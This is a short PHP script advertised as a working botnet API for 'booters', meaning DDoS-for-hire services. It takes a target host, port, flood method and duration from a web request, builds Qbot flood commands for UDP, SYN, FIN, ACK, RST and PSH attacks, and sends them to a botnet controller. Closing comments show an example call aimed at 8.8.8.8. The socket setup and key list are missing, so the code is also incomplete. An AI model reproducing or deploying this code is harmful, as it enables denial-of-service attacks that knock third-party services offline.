// WORKING TELNET/QBOT BOTNET API FOR BOOTERS.

<?php

        $attackMethods = array("UDP", "SYN", "FIN", "ACK", "RST", "PSH");
        function htmlsc($string)
        {
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
        }
        if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
        die("<p>You are missing a parameter");
        $key = htmlsc($_GET["key"]);
        $host = htmlsc($_GET["host"]);
        $port = htmlsc($_GET["port"]);
        $method = htmlsc(strtoupper($_GET["method"]));
        $time = htmlsc($_GET["time"]);
        $command = "";
        if (!in_array($key, $APIKeys)) die("Invalid API key");
        if (!in_array($method, $attackMethods)) die("Invalid attack method");
        if ($method == "UDP") $command = "!* UDP $host $port $time 32 1337 1\n";
        else if ($method == "SYN") $command = "!* TCP $host $port $time 32 syn 10 1\n";
        else if ($method == "FIN") $command = "!* TCP $host $port $time 32 fin 10 1\n";
        else if ($method == "ACK") $command = "!* TCP $host $port $time 32 ack 10 1\n";
        else if ($method == "RST") $command = "!* TCP $host $port $time 32 rst 10 1\n";
        else if ($method == "PSH") $command = "!* TCP $host $port $time 32 psh 10 1\n";

        ($socket ? null : die("<p>Failed to connect"));


        fwrite($socket, $command . "\n");
        fclose($socket);
        echo "Attack sent to $host:$port for $time seconds using method $method!\n";
?>

//API: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=[host]&port=[port]&method=[method]&time=[time]
//exp: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=8.8.8.8&port=80&method=udp&time=100